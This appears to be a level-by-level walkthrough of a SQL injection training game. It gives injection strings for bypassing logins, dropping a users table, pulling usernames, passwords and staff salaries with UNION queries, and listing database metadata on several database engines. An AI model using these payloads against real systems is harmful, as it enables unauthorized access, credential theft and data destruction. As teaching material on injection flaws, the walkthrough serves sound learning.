Level 1

Challenge: Try to log in as 'jane' without knowing her password.

Solution: jane'; --

Explanation: We set the username to jane and comment out the part where the program validates it.

Level 2

Challenge: Drop table users.

Solution: ' ; DROP TABLE users; --

Explanation: Close the username query, start the DROP TABLE query, and then comment out the rest.

Level 3

Challenge: Log in with any username.

Solution: ' OR 1=1; --

Explanation: This makes the query always true, logging in with any user.

Level 4

Challenge: The program blocks multiple rows, limit to one row.

Solution: ' OR 1=1 ORDER BY user_id LIMIT 1 --

Explanation: We limit the query to only one row to bypass the restriction.

Level 5

Challenge: Output usernames and passwords of all users.

Solution: ' UNION select username, password from users; --

Explanation: Using UNION to merge results and fetch usernames and passwords.

Level 6

Challenge: There may be a staff table in the database.

Solution: ' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' --

Explanation: The key is to continue the query and look for staff information.

Level 7

Challenge: Output name, email, salary, and employed_since from the staff table.

Solution: ' UNION SELECT name, email, salary, employed_since FROM staff --

Explanation: Using UNION to merge the queries and output the required staff details.

Level 8

Challenge: Find out which database we are dealing with and output metadata.

Solution (Oracle): ' UNION SELECT table_id, table_name, num_rows, null FROM sys.user_tables --

Solution (MySQL, SQL Server, PostgreSQL): ' UNION SELECT table_name, table_type, table_rows, null FROM information_schema.tables --

Solution (SQLLite): ' UNION SELECT type, name, tbl_name, null FROM sqlite_master --

Explanation: Different database systems use different tables to hold metadata. Try each one based on the system you're using.

Level 9

Challenge: The database has a table called customers. Find out which columns it has.

Solution: ' UNION SELECT table_name, column_name, data_type, null FROM information_schema.columns WHERE table_name = 'customers' --

Explanation: Use UNION to get column names and data types for the 'customers' table.
